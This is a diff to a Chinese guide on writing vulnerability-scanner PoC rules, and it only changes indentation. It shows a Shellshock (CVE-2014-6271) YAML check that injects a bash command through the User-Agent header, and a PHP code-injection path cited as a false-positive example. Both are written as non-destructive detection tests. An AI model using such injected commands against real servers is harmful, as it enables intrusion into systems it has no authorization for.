@@ -47,6 +47,7 @@
     1. 如果对方安装了xdebug等调试类扩展，`var_dump`等函数输出可能存在差异导致查找不成功
   
     以下就是一个例子，如果页面显示是 `/admin/?a=Factory();printf('{{r1}}');//../ 404 not found` 那就会误报。
+
     ```yaml
         method: GET
         path: /admin/?a=Factory();printf('{{r1}}');//../
@@ -67,19 +68,19 @@
     1. 考虑到有些32位系统整数上限可能低于`2^^31`和数字过短可能误报，目前要求乘法两个数字的取值范围必须在 `40000` 和 `44800` 之间，加法两个数字必须在 `800000000` 和 `1000000000` 之间。
 
     ```yaml
-    name: poc-yaml-bash-cve-2014-6271
-    set:
-    r1: randomInt(800000000, 1000000000)
-    r2: randomInt(800000000, 1000000000)
-    rules:
-    - method: GET
-        headers:
-        User-Agent: "() { :; }; echo; echo; /bin/bash -c 'expr {{r1}} + {{r2}}'"
-        expression: response.body.bcontains(bytes(string(r1+r2)))
-    detail:
-    author: example(https://github.com/example)
-    links:
-        - https://github.com/opsxcq/exploit-CVE-2014-6271
+        name: poc-yaml-bash-cve-2014-6271
+        set:
+        r1: randomInt(800000000, 1000000000)
+        r2: randomInt(800000000, 1000000000)
+        rules:
+        - method: GET
+            headers:
+            User-Agent: "() { :; }; echo; echo; /bin/bash -c 'expr {{r1}} + {{r2}}'"
+            expression: response.body.bcontains(bytes(string(r1+r2)))
+        detail:
+        author: example(https://github.com/example)
+        links:
+            - https://github.com/opsxcq/exploit-CVE-2014-6271
     ```
 
 1. 上传类 poc 测试希望上传的文件由两部分构成，一是 echo/print 一串字符串用于确认漏洞存在，二是执行自删除逻辑，删除测试产生的垃圾文件。可以参考: http://doc.bugscan.net/chapter3/3-3.html
